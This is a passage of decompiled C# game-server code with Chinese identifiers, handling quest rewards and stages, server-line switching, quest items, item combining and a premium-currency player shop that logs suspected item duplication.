				player.AddItemWithProperties(value2.物品ID, num30, value2.物品数量, value3.FLD_MAGIC0, value3.FLD_MAGIC1, value3.FLD_MAGIC2, value3.FLD_MAGIC3, value3.FLD_MAGIC4, 0, 0, 0, 1, 0);
				break;
			}
			case 1008000003:
			case 1008000044:
			case 1008000045:
			case 1008000055:
			{
				for (int num28 = 0; num28 < value2.物品数量; num28++)
				{
					int num29 = player.GetEmptyBagSlot();
					if (num29 == -1)
					{
						num29 = 35;
					}
					player.AddItemWithProperties(value2.物品ID, num29, 1, value3.FLD_MAGIC0, value3.FLD_MAGIC1, value3.FLD_MAGIC2, value3.FLD_MAGIC3, value3.FLD_MAGIC4, 0, 0, 0, 1, 0);
				}
				break;
			}
			}
			if (value3.FLD_QUESTITEM == 1)
			{
				player.设置任务物品(value2.物品ID, value2.物品数量);
				return;
			}
			if (value2.奖励类型 != 0)
			{
				return;
			}
			if (value3.FLD_SIDE == 1)
			{
				int num31 = player.GetEmptyBagSlot();
				if (num31 == -1)
				{
					num31 = 0;
				}
				player.AddItemWithProperties(value2.物品ID, num31, value2.物品数量, value3.FLD_MAGIC0, value3.FLD_MAGIC1, value3.FLD_MAGIC2, value3.FLD_MAGIC3, value3.FLD_MAGIC4, 0, 0, 0, value2.是否绑定, value2.时间);
				return;
			}
			for (int num32 = 0; num32 < value2.物品数量; num32++)
			{
				int num33 = player.GetEmptyBagSlot();
				if (num33 == -1)
				{
					num33 = 0;
				}
				player.AddItemWithProperties(value2.物品ID, num33, 1, value3.FLD_MAGIC0, value3.FLD_MAGIC1, value3.FLD_MAGIC2, value3.FLD_MAGIC3, value3.FLD_MAGIC4, 0, 0, 0, value2.是否绑定, 0);
			}
		}

		public void 换线(int 任务ID, int num2, int 任务阶段ID, int 服务器序号)
		{
			int num3 = 0;
			if (服务器序号 == 1 && World.打开换线线路1 == 1)
			{
				num3 = 1;
			}
			else if (服务器序号 == 2 && World.打开换线线路2 == 1)
			{
				num3 = 2;
			}
			else if (服务器序号 == 3 && World.打开换线线路3 == 1)
			{
				num3 = 3;
			}
			else if (服务器序号 == 4 && World.打开换线线路4 == 1)
			{
				num3 = 4;
			}
			else if (服务器序号 == 5 && World.打开换线线路5 == 1)
			{
				num3 = 5;
			}
			else if (服务器序号 == 6 && World.打开换线线路6 == 1)
			{
				num3 = 6;
			}
			else if (服务器序号 == 7 && World.打开换线线路7 == 1)
			{
				num3 = 7;
			}
			else if (服务器序号 == 8 && World.打开换线线路8 == 1)
			{
				num3 = 8;
			}
			else if (服务器序号 == 9 && World.打开换线线路9 == 1)
			{
				num3 = 9;
			}
			else if (服务器序号 == 10 && World.打开换线线路10 == 1)
			{
				num3 = 10;
			}
			else if (服务器序号 == 11 && World.打开换线线路11 == 1)
			{
				num3 = 11;
			}
			else if (服务器序号 == 12 && World.打开换线线路12 == 1)
			{
				num3 = 12;
			}
			int num4 = num3 - 1;
			switch (num2)
			{
			case 1:
				if (num4 == base.原服务器序号)
				{
					任务提示(任务ID, 12, 任务阶段ID);
					系统提示("当前人物所在线路和要切换线路相同。", 10, "线路提示");
				}
				else
				{
					任务提示(任务ID, 11, 任务阶段ID);
				}
				break;
			case 2:
			{
				ServerList value2;
				if (num4 == base.原服务器序号)
				{
					任务提示(任务ID, 12, 任务阶段ID);
					系统提示("当前人物所在线路和要切换线路相同。", 10, "线路提示");
				}
				else if (SerList.TryGetValue(num4, out value2))
				{
					任务提示数据发送(任务ID, 21, 1);
					系统提示(服务器序号 + "线, 线路切换中，请稍等。。。", 10, "线路管理员");
					任务提示数据发送(任务ID, 41, 0);
					World.conn.发送("更新原服务器|" + base.Userid + "|" + num4 + "|" + value2.服务器IP + "|" + value2.服务器端口 + "|" + value2.服务器ID);
					换线(value2.服务器ID, value2.服务器IP, value2.服务器端口);
				}
				else
				{
					任务提示(任务ID, 12, 任务阶段ID);
					系统提示(服务器序号 + "线路尚未开放或禁止换线...", 10, "线路提示");
				}
				break;
			}
			case 3:
				任务提示(任务ID, 31, 任务阶段ID);
				break;
			case 4:
				if (任务.ContainsKey(任务ID))
				{
					任务.TryRemove(任务ID, out var _);
				}
				任务提示数据发送(任务ID, 41, 任务阶段ID);
				break;
			case 5:
				任务提示(任务ID, 51, 任务阶段ID);
				break;
			}
		}

		public void 设置任务数据_DATA(int 任务ID, int 任务阶段ID)
		{
			if (!World.任务list.TryGetValue(任务ID, out var value))
			{
				return;
			}
			if (任务.TryGetValue(任务ID, out var value2))
			{
				value2.任务阶段ID = 任务阶段ID;
				if (value.任务阶段数量 + 1 == 任务阶段ID)
				{
					switch (任务ID)
					{
					case 12:
						人物转职业(2, 2);
						if (BitConverter.ToInt16(气功[6].气功_byte, 0) == 255)
						{
							气功[6] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(6, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						base.Player_Money += 2000000L;
						更新武功和状态();
						break;
					case 11:
						人物转职业(1, 2);
						if (BitConverter.ToInt16(气功[6].气功_byte, 0) == 255)
						{
							气功[6] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(6, base.Player_Job),
								气功量 = 0
							};
						}
						base.Player_Money += 2000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 54:
						人物转职业(base.Player_Zx, 3);
						if (BitConverter.ToInt16(气功[7].气功_byte, 0) == 255)
						{
							气功[7] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(7, base.Player_Job),
								气功量 = 0
							};
						}
						base.Player_Money += 3000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 53:
						人物转职业(base.Player_Zx, 3);
						if (BitConverter.ToInt16(气功[7].气功_byte, 0) == 255)
						{
							气功[7] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(7, base.Player_Job),
								气功量 = 0
							};
						}
						base.Player_Money += 3000000L;
						初始化气功();
						更新武功和状态();
						break;
					case 18:
						人物转职业(0, 1);
						if (BitConverter.ToInt16(气功[5].气功_byte, 0) == 255)
						{
							气功[5] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(5, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						更新武功和状态();
						break;
					case 131:
						if (BitConverter.ToInt16(气功[9].气功_byte, 0) == 255)
						{
							气功[9] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(9, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						更新武功和状态();
						break;
					case 82:
						人物转职业(base.Player_Zx, 4);
						if (BitConverter.ToInt16(气功[8].气功_byte, 0) == 255)
						{
							气功[8] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(8, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						更新武功和状态();
						break;
					case 81:
						人物转职业(base.Player_Zx, 4);
						if (BitConverter.ToInt16(气功[8].气功_byte, 0) == 255)
						{
							气功[8] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(8, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						更新武功和状态();
						break;
					case 1101:
						徒弟更新师徒系统();
						break;
					case 1102:
						徒弟更新师徒系统();
						break;
					case 1103:
						徒弟更新师徒系统();
						break;
					case 1104:
						徒弟更新师徒系统();
						break;
					case 1002:
						灵兽转职业(0, 1);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1003:
						灵兽转职业(1, 2);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1004:
						灵兽转职业(2, 2);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1005:
						灵兽转职业(1, 3);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 1006:
						灵兽转职业(2, 3);
						人物灵兽.计算基本数据();
						更新灵兽HP_MP_SP();
						更新灵兽武功和状态();
						更新灵兽负重();
						召唤更新显示已装备物品(this);
						任务提示(任务ID, 21, 1);
						更新人物任务();
						break;
					case 178:
						人物转职业(base.Player_Zx, 5);
						if (BitConverter.ToInt16(气功[10].气功_byte, 0) == 255)
						{
							气功[10] = new 气功类(new byte[2])
							{
								气功ID = 得到气功ID(10, base.Player_Job),
								气功量 = 0
							};
						}
						初始化气功();
						学习技能(0, 25);
						学习技能(0, 26);
						学习技能(0, 27);
						更新武功和状态();
						break;
					}
					任务类 value3;
					if (value.任务类型 == 1)
					{
						value2.任务阶段ID = 0;
					}
					else if (value.任务类型 == 2)
					{
						任务.TryRemove(任务ID, out value3);
						SavePlayerData();
					}
					else
					{
						任务提示数据发送(任务ID, 41, 0);
						任务.TryRemove(任务ID, out value3);
						SavePlayerData();
					}
				}
			}
			else
			{
				任务类 任务类2 = new 任务类
				{
					任务ID = 任务ID,
					任务阶段ID = 任务阶段ID
				};
				任务阶段类 item = new 任务阶段类();
				任务类2.任务阶段.Add(item);
				任务.TryAdd(任务ID, 任务类2);
			}
			更新人物任务();
		}

		public int Get任务阶段(int 任务ID)
		{
			任务类 value;
			return 任务.TryGetValue(任务ID, out value) ? value.任务阶段ID : 0;
		}

		public void 任务提示数据发送(int 任务ID, int 操作ID, int 任务阶段ID)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write2(任务ID);
			发包类.Write2(操作ID);
			发包类.Write2(任务阶段ID);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 33792, base.人物全服ID);
			}
		}

		public void 得到任务物品(int 物品位置, int 物品ID, int 物品数量)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(物品位置);
			发包类.Write4(0);
			发包类.Write4(物品ID);
			发包类.Write4(0);
			发包类.Write4(物品数量);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 33280, base.人物全服ID);
			}
		}

		public bool 得到任务物品(int 物品ID, int 物品数量)
		{
			for (int i = 0; i < 任务物品.Length; i++)
			{
				if (任务物品[i].物品ID == 物品ID && 任务物品[i].物品数量 >= 物品数量)
				{
					return true;
				}
			}
			return false;
		}

		public void 设置任务物品(int 物品ID, int 物品数量)
		{
			bool flag = false;
			bool flag2 = false;
			for (int i = 0; i < 任务物品.Length; i++)
			{
				if (任务物品[i].物品ID == 物品ID)
				{
					flag = true;
					flag2 = true;
					if (物品数量 == 0)
					{
						得到任务物品(i, 任务物品[i].物品ID, 0);
						任务物品[i].物品_byte = new byte[8];
					}
					else
					{
						任务物品[i].物品数量 += 物品数量;
						得到任务物品(i, 任务物品[i].物品ID, 任务物品[i].物品数量);
					}
					break;
				}
			}
			if (!flag && 物品数量 > 0)
			{
				for (int j = 0; j < 任务物品.Length; j++)
				{
					if (任务物品[j].物品ID == 0)
					{
						任务物品[j].物品ID = 物品ID;
						任务物品[j].物品数量 += 物品数量;
						得到任务物品(j, 任务物品[j].物品ID, 任务物品[j].物品数量);
						flag2 = true;
						break;
					}
				}
			}
			if (!flag2)
			{
				系统提示("任务物品已满不能继续。");
			}
		}

		public void 设置任务数据(int 任务ID, int 任务阶段ID)
		{
			if (!World.任务list.TryGetValue(任务ID, out var value))
			{
				return;
			}
			if (任务.TryGetValue(任务ID, out var value2))
			{
				value2.任务阶段ID = 任务阶段ID;
				任务类 value3;
				if (任务阶段ID == 0)
				{
					任务.TryRemove(任务ID, out value3);
					SavePlayerData();
				}
				else if (value.任务阶段数量 + 1 == 任务阶段ID)
				{
					if (value.任务类型 == 1)
					{
						value2.任务阶段ID = 0;
					}
					else if (value.任务类型 == 2)
					{
						任务.TryRemove(任务ID, out value3);
						SavePlayerData();
					}
					else
					{
						任务提示数据发送(任务ID, 41, 0);
						任务.TryRemove(任务ID, out value3);
						SavePlayerData();
					}
				}
			}
			else
			{
				任务类 任务类2 = new 任务类
				{
					任务ID = 任务ID,
					任务阶段ID = 任务阶段ID
				};
				任务阶段类 item = new 任务阶段类();
				任务类2.任务阶段.Add(item);
				任务.TryAdd(任务ID, 任务类2);
			}
			更新人物任务();
		}

		public bool IsInteger(string 名字)
		{
			if (名字 == "")
			{
				return false;
			}
			int num = 0;
			while (true)
			{
				if (num < 名字.Length)
				{
					char c = 名字[num];
					if (!char.IsNumber(c))
					{
						break;
					}
					num++;
					continue;
				}
				return true;
			}
			return false;
		}

		public bool 检查任务物品数量(int 物品ID, int 物品数量)
		{
			for (int i = 0; i < 36; i++)
			{
				if (任务物品[i].物品ID == 物品ID && 任务物品[i].物品数量 == 物品数量)
				{
					return true;
				}
			}
			return false;
		}

		public void del任务物品(int 物品ID, int 物品数量)
		{
			if (物品数量 <= 0 || !World.Itme.TryGetValue(物品ID, out var value))
			{
				return;
			}
			if (value.FLD_QUESTITEM == 1)
			{
				int num = 0;
				while (true)
				{
					if (num < 36)
					{
						if (任务物品[num].物品ID == 物品ID)
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				if (任务物品[num].物品数量 == 物品数量)
				{
					任务物品[num] = new 任务物品类(new byte[8]);
				}
				else
				{
					任务物品[num].物品数量 -= 物品数量;
				}
				发送任务物品列表();
				return;
			}
			switch (物品ID)
			{
			case 909000001:
				base.人物经验 -= 物品数量;
				计算人物基本数据3();
				更新经验和历练();
				return;
			case 909000002:
				base.Player_ExpErience -= 物品数量;
				更新经验和历练();
				return;
			case 909000004:
				base.Player_Money -= (uint)物品数量;
				得到钱的提示((uint)物品数量);
				更新金钱和负重();
				return;
			case 909000005:
				base.Player_WuXun -= 物品数量;
				更新武功和状态();
				return;
			}
			物品类[] 装备栏包裹 = base.装备栏包裹;
			物品类[] array = 装备栏包裹;
			物品类[] array2 = array;
			foreach (物品类 物品类2 in array2)
			{
				if (物品类2.Get物品ID == 物品ID)
				{
					物品使用(1, 物品类2.物品位置, 物品数量);
				}
			}
		}

		public void 更新人物任务()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(任务.Count);
			foreach (任务类 value in 任务.Values)
			{
				发包类.Write2(value.任务ID);
				发包类.Write2(value.任务阶段ID);
			}
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 34048, base.人物全服ID);
			}
		}

		public void 更新人物任务2(int pid)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(任务.Count);
			foreach (任务类 value in 任务.Values)
			{
				发包类.Write2(value.任务ID);
				if (value.任务ID == pid)
				{
					发包类.Write2(value.任务阶段ID);
				}
				else if (value.任务阶段ID == 0)
				{
					发包类.Write2(1);
				}
				else
				{
					发包类.Write2(value.任务阶段ID);
				}
			}
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 34048, base.人物全服ID);
			}
		}

		private void 道具组合(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			int num2 = BitConverter.ToInt32(封包数据, 22);
			switch (num)
			{
			case 800000047:
			{
				int num7 = 0;
				int num8 = 0;
				for (int k = 0; k < 96; k++)
				{
					if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 800000046)
					{
						num7 += BitConverter.ToInt32(装备栏包裹[k].物品数量, 0);
					}
					else if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1000000771 && BitConverter.ToInt32(装备栏包裹[k].物品数量, 0) >= 10 * num2)
					{
						num8 = 1;
					}
				}
				if (num7 < 5 * num2 || num8 == 0)
				{
					道具组合提示(3, num, num2);
					break;
				}
				if (得到包裹空位数() < num2)
				{
					道具组合提示(4, num, num2);
					break;
				}
				int num9 = 5 * num2;
				for (int l = 0; l < 96; l++)
				{
					if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 800000046)
					{
						if (num9 > 0)
						{
							减去物品(l, 1);
							num9--;
						}
					}
					else if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1000000771)
					{
						减去物品(l, 10 * num2);
					}
				}
				for (int m = 0; m < num2; m++)
				{
					int 位置 = 得到包裹空位(this);
					byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					byte[] array = new byte[56];
					Buffer.BlockCopy(BitConverter.GetBytes(RNG.Next(23, 51)), 0, array, 0, 4);
					增加物品2(bytes, BitConverter.GetBytes(num), 位置, BitConverter.GetBytes(1), array);
				}
				道具组合提示(1, num, num2);
				break;
			}
			case 1000000772:
			{
				int num5 = 0;
				物品类 物品类2 = 得到包裹物品(1000000771);
				if (物品类2 != null && BitConverter.ToInt32(物品类2.物品数量, 0) >= 3 * num2)
				{
					num5 = 1;
				}
				if (num5 == 0)
				{
					道具组合提示(3, num, num2);
					break;
				}
				int num6 = 得到包裹空位(this);
				if (num6 == -1)
				{
					道具组合提示(4, num, num2);
					break;
				}
				减去物品(物品类2.物品位置, 3 * num2);
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(num), num6, BitConverter.GetBytes(num2), new byte[56]);
				道具组合提示(1, num, num2);
				break;
			}
			case 1000000773:
			{
				int num3 = 0;
				for (int i = 0; i < 96; i++)
				{
					if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000772 && BitConverter.ToInt32(装备栏包裹[i].物品数量, 0) >= 2 * num2)
					{
						num3 = 1;
						break;
					}
				}
				if (num3 == 0)
				{
					道具组合提示(3, num, num2);
					break;
				}
				int num4 = 得到包裹空位(this);
				if (num4 == -1)
				{
					道具组合提示(4, num, num2);
					break;
				}
				for (int j = 0; j < 96; j++)
				{
					if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000772)
					{
						减去物品(j, 2 * num2);
					}
				}
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(num), num4, BitConverter.GetBytes(num2), new byte[56]);
				道具组合提示(1, num, num2);
				break;
			}
			}
		}

		private void 道具组合提示(int 提示ID, int 物品ID, int 物品数量)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write2(11);
			发包类.Write2(提示ID);
			发包类.Write8(物品ID);
			发包类.Write4(物品数量);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 793, base.人物全服ID);
			}
		}

		private void 元宝个人商店(byte[] data, int length)
		{
			switch (data[10])
			{
			case 1:
			{
				byte[] array3 = new byte[BitConverter.ToUInt16(data, 11)];
				Buffer.BlockCopy(data, 13, array3, 0, array3.Length);
				string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				if (打开仓库中)
				{
					元宝个人商店功能包(1, 11, text, null);
					break;
				}
				if (text.Length < 2 || text.Length > 16)
				{
					元宝个人商店功能包(1, 12, text, null);
					break;
				}
				if (base.Player_Level <= 20)
				{
					元宝个人商店功能包(1, 13, text, null);
					break;
				}
				元宝个人商店功能包(1, 1, text, null);
				打开仓库中 = true;
				个人商店 = new 个人商店类
				{
					商店名 = array3,
					商店类型 = 2
				};
				break;
			}
			case 2:
			{
				byte[] dst = new byte[4];
				byte[] dst2 = new byte[8];
				byte[] array = new byte[8];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 11, dst, 0, 4);
				Buffer.BlockCopy(data, 19, dst2, 0, 8);
				Buffer.BlockCopy(data, 27, array2, 0, 2);
				Buffer.BlockCopy(data, 31, array, 0, 8);
				int num = BitConverter.ToInt16(data, 29);
				if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 0)
				{
					元宝个人商店功能包(2, 21, null, null);
					break;
				}
				if (BitConverter.ToInt32(array2, 0) <= 0)
				{
					元宝个人商店功能包(2, 22, null, null);
					break;
				}
				if (BitConverter.ToInt32(array2, 0) > 9999)
				{
					元宝个人商店功能包(2, 23, null, null);
					break;
				}
				if (BitConverter.ToInt32(array, 0) <= 0)
				{
					元宝个人商店功能包(2, 24, null, null);
					break;
				}
				if (BitConverter.ToInt32(array, 0) > 100000)
				{
					元宝个人商店功能包(2, 25, null, null);
					break;
				}
				if (个人商店.商店物品列表.Count >= 8)
				{
					元宝个人商店功能包(2, 26, null, null);
					break;
				}
				if (BitConverter.ToInt32(装备栏包裹[num].物品数量, 0) < BitConverter.ToInt32(array2, 0))
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				if (装备栏包裹[num].物品绑定)
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				if (个人商店.商店物品列表.TryGetValue(BitConverter.ToInt64(装备栏包裹[num].物品全局ID, 0), out var _))
				{
					元宝个人商店功能包(2, 27, null, null);
					break;
				}
				个人商店物品类 个人商店物品类2 = new 个人商店物品类
				{
					数量 = BitConverter.ToInt32(array2, 0),
					价格 = BitConverter.ToInt32(array, 0),
					位置 = num,
					物品 = 装备栏包裹[num]
				};
				个人商店.商店物品列表.Add(BitConverter.ToInt64(装备栏包裹[num].物品全局ID, 0), 个人商店物品类2);
				元宝个人商店功能包(2, 2, null, 个人商店物品类2);
				break;
			}
			case 3:
				元宝个人商店功能包(3, 3, null, null);
				个人商店显示包(3, base.人物全服ID, 个人商店.商店名);
				个人商店.个人商店是否开启 = true;
				break;
			case 4:
				元宝个人商店关店();
				break;
			case 5:
				if (元宝个人商店是否开通 == 0)
				{
					元宝个人商店查询是否开通包(0);
				}
				else if (元宝个人商店是否开通 == 1)
				{
					元宝个人商店查询是否开通包(1);
				}
				break;
			}
		}

		private void 元宝个人商店关店()
		{
			if (个人商店 != null)
			{
				打开仓库中 = false;
				元宝个人商店功能包(4, 4, null, null);
				个人商店显示包(4, base.人物全服ID, null);
				if (个人商店.进入人 != null)
				{
					个人商店.进入人.进店中 = false;
					个人商店.进入人.打开仓库中 = false;
					个人商店.进入人.进店中ID = 0;
					个人商店.进入人.进元宝个人商店功能包(3, 3, base.人物全服ID, 个人商店.进入人.人物全服ID, null, null);
				}
				个人商店.个人商店是否开启 = false;
				个人商店.商店物品列表.Clear();
				个人商店.Dispose();
				个人商店.进入人 = null;
				个人商店 = null;
			}
			else
			{
				if (!进店中 || 进店中ID == 0)
				{
					return;
				}
				Players players = 得到人物数据(进店中ID);
				if (players != null && players.个人商店 != null)
				{
					if (players.个人商店.商店类型 == 1)
					{
						出店(进店中ID);
					}
					else if (players.个人商店.商店类型 == 2)
					{
						元宝个人商店出店(进店中ID);
					}
				}
			}
		}

		private void 进元宝个人商店(byte[] data, int length)
		{
			封包修改(data, length);
			int num = BitConverter.ToInt32(data, 11);
			switch (data[10])
			{
			case 1:
				try
				{
					if (打开仓库中)
					{
						进元宝个人商店功能包(1, 14, num, 0, null, null);
						break;
					}
					Players players2 = 得到人物数据(num);
					if (players2 != null && players2.个人商店 != null && players2.个人商店.个人商店是否开启)
					{
						if (!查找范围玩家(40, players2))
						{
							进元宝个人商店功能包(1, 12, num, 0, null, null);
							break;
						}
						if (players2.个人商店.个人商店是否使用中)
						{
							进元宝个人商店功能包(1, 13, num, 0, null, null);
							break;
						}
						players2.个人商店.个人商店是否使用中 = true;
						players2.个人商店.进入人 = this;
						进店中 = true;
						进店中ID = num;
						打开仓库中 = true;
						进元宝个人商店功能包(1, 1, players2.人物全服ID, 0, players2.个人商店.商店名, players2.个人商店.商店物品列表);
						players2.进元宝个人商店功能包(1, 1, players2.人物全服ID, base.人物全服ID, null, null);
					}
				}
				catch (Exception ex3)
				{
					MainForm.WriteLine(1, "进元宝个人商店 1 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex3);
				}
				break;
			case 2:
				try
				{
					int num2 = BitConverter.ToInt32(data, 15);
					long num3 = BitConverter.ToInt64(data, 23);
					int num4 = BitConverter.ToInt16(data, 31);
					Players players = 得到人物数据(num);
					if (players == null || !players.打开仓库中 || !players.个人商店.商店物品列表.TryGetValue(num3, out var value))
					{
						break;
					}
					int num5 = 得到包裹空位(this);
					if (num5 == -1)
					{
						进元宝个人商店功能包(2, 24, num, 0, null, null);
						break;
					}
					if (num4 > value.物品.Get物品数量)
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
						break;
					}
					if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) == 0)
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
						break;
					}
					if (BitConverter.ToInt64(players.装备栏包裹[value.位置].物品全局ID, 0) != num3)
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
						break;
					}
					if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) != num2)
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
						break;
					}
					if (num3 == 0)
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
						break;
					}
					if (base.FLD_RXPIONT < value.价格 * num4)
					{
						进元宝个人商店功能包(2, 22, num, 0, null, null);
						break;
					}
					物品类 物品类2 = 得到人物物品物品全局ID(players, num3);
					if (物品类2 != null)
					{
						if (BitConverter.ToInt32(物品类2.物品数量, 0) < value.数量)
						{
							MainForm.WriteLine(6, "非法复制_元宝个人商店_进店1[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + value.数量 + "]");
							break;
						}
						if (World.Itme[BitConverter.ToInt32(物品类2.物品ID, 0)].FLD_SIDE == 0 && BitConverter.ToInt32(物品类2.物品数量, 0) > 1)
						{
							MainForm.WriteLine(6, "非法复制_元宝个人商店_进店2[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + value.数量 + "]");
							break;
						}
						MainForm.WriteLine(5, "[" + players.Userid + "][" + players.UserName + "] 元宝个人商店买出物品 :[" + base.Userid + "][" + base.UserName + "] (物品:" + 物品类2.得到物品名称() + "/编号:" + BitConverter.ToInt32(物品类2.得到全局ID(), 0) + "属性:[" + 物品类2.FLD_MAGIC0 + ", " + 物品类2.FLD_MAGIC1 + ", " + 物品类2.FLD_MAGIC2 + ", " + 物品类2.FLD_MAGIC3 + ", " + 物品类2.FLD_MAGIC4 + "] 价格[" + value.价格 + "]");
						players.检察元宝数据((int)(value.价格 * num4), 1, "开店");
						检察元宝数据((int)(value.价格 * num4), 0, "开店");
						string userid = players.Userid;
						string userName = players.UserName;
						string userid2 = base.Userid;
						string userName2 = base.UserName;
						double 全局ID = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						int 物品ID = BitConverter.ToInt32(物品类2.物品ID, 0);
						string 物品名 = 物品类2.得到物品名称();
						int 物品数量 = num4;
						string[] array = new string[15]
						{
							物品类2.FLD_MAGIC0.ToString(),
							"-",
							物品类2.FLD_MAGIC1.ToString(),
							"-",
							物品类2.FLD_MAGIC2.ToString(),
							"-",
							物品类2.FLD_MAGIC3.ToString(),
							"-",
							物品类2.FLD_MAGIC4.ToString(),
							"初",
							null,
							null,
							null,
							null,
							null
						};
						array[10] = 物品类2.FLD_FJ_觉醒.ToString();
						array[11] = "中";
						array[12] = 物品类2.FLD_FJ_中级附魂.ToString();
						array[13] = "进";
						array[14] = 物品类2.FLD_FJ_进化.ToString();
						string 物品属性 = string.Concat(array);
						int 钱数 = (int)(value.价格 * num4);
						RxjhClass.物品记录(userid, userName, userid2, userName2, 全局ID, 物品ID, 物品名, 物品数量, 物品属性, 钱数, "元宝商店");
						using (发包类 发包类 = new 发包类())
						{
							发包类.Write(2);
							发包类.Write(2);
							发包类.Write4(num);
							发包类.Write8(value.物品.Get物品ID);
							发包类.Write8(num3);
							发包类.Write2(num4);
							发包类.Write2(value.位置);
							发包类.Write8(value.价格);
							发包类.Write4(value.物品.FLD_MAGIC0);
							发包类.Write4(value.物品.FLD_MAGIC1);
							发包类.Write4(value.物品.FLD_MAGIC2);
							发包类.Write4(value.物品.FLD_MAGIC3);
							发包类.Write4(value.物品.FLD_MAGIC4);
							发包类.Write2(value.物品.FLD_FJ_MAGIC0);
							发包类.Write2(value.物品.FLD_FJ_MAGIC1);
							发包类.Write2(value.物品.FLD_FJ_中级附魂);
							发包类.Write2(value.物品.FLD_FJ_MAGIC2);
							发包类.Write2(value.物品.FLD_FJ_MAGIC3);
							发包类.Write2(value.物品.FLD_FJ_MAGIC4);
							发包类.Write2(value.物品.FLD_FJ_MAGIC5);
							发包类.Write2(0);
							发包类.Write4(value.物品.FLD_KSSJ);
							发包类.Write4(value.物品.FLD_JSSJ);
							发包类.Write2(value.物品.FLD_FJ_NJ);
							发包类.Write4(value.物品.FLD_FJ_觉醒);
							发包类.Write2(0);
							发包类.Write2(value.物品.FLD_FJ_进化);
							发包类.Write2(0);
							发包类.Write8(num3);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 3868, base.人物全服ID);
							}
							if (players.Client != null)
							{
								players.Client.SendPak(发包类, 3868, base.人物全服ID);
							}
						}
						增加物品(物品类2.物品全局ID, 物品类2.物品ID, num5, BitConverter.GetBytes(num4), 物品类2.物品属性);
						players.减去物品(物品类2.物品位置, num4);
						if (value.数量 - num4 > 0)
						{
							value.数量 -= num4;
						}
						else
						{
							players.个人商店.商店物品列表.Remove(num3);
						}
						SaveGemData();
						players.SaveGemData();
						if (players.个人商店.商店物品列表.Count == 0)
						{
							players.元宝个人商店关店();
						}
					}
					else
					{
						进元宝个人商店功能包(2, 21, num, 0, null, null);
					}
				}
				catch (Exception ex2)
				{
					MainForm.WriteLine(1, "进元宝个人商店 2 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex2);
				}
				break;
			case 3:
				try
				{
					元宝个人商店出店(num);
				}
